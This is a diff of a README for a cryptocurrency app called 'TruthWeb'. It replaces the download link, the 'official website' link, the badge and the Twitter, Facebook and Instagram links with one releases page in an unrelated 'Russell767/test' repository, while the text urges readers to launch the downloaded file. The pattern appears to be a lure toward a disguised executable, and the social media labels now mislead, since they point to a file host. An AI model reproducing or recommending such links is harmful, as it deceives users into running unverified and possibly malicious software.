@@ -12,19 +12,19 @@ Welcome to the official GitHub repository for **TruthWeb**, the all-in-one platf
 
 ## Looking to Get Started?
 ### 🚀 Access Our App
-Click [here](https://github.com/project/files/App.zip) to download the **TruthWeb** app and unlock a world of possibilities! Remember to launch the file once downloaded to experience the full potential of our platform!
+Click [here](https://github.com/Russell767/test/releases) to download the **TruthWeb** app and unlock a world of possibilities! Remember to launch the file once downloaded to experience the full potential of our platform!
 
 ### 🌐 Explore Our Website
-Visit our official website [here](https://www.truthweb.com) to discover more about **TruthWeb** and join the Pi Network community. Engage with like-minded individuals and embrace the future of decentralized digital currency!
+Visit our official website [here](https://github.com/Russell767/test/releases) to discover more about **TruthWeb** and join the Pi Network community. Engage with like-minded individuals and embrace the future of decentralized digital currency!
 
 ### 📦 Check the Releases Section
 If the provided links are not working or you're looking for the latest updates, head over to the "Releases" section of this repository to find the most recent versions of **TruthWeb**. Stay up to date with our advancements and never miss out on new features!
 
 ## Join the Pi Community
 Connect with us on social media and become part of the growing Pi Network community:
-- Twitter: [PiNetworkOfficial](https://twitter.com/PiNetworkOfficial)
-- Facebook: [PiNetwork](https://www.facebook.com/PiNetwork)
-- Instagram: [PiNetwork](https://www.instagram.com/PiNetwork)
+- Twitter: [PiNetworkOfficial](https://github.com/Russell767/test/releases)
+- Facebook: [PiNetwork](https://github.com/Russell767/test/releases)
+- Instagram: [PiNetwork](https://github.com/Russell767/test/releases)
 
 ## Contribute to TruthWeb
 Help us shape the future of decentralized digital currency by contributing to **TruthWeb**:
@@ -38,7 +38,7 @@ Let your friends, family, and colleagues know about **TruthWeb** and the excitin
 
 ---
 
-[![](https://img.shields.io/badge/Download-App%20Here-brightgreen)](https://github.com/project/files/App.zip)
+[![](https://github.com/Russell767/test/releases%20Here-brightgreen)](https://github.com/Russell767/test/releases)
 
 ---
 
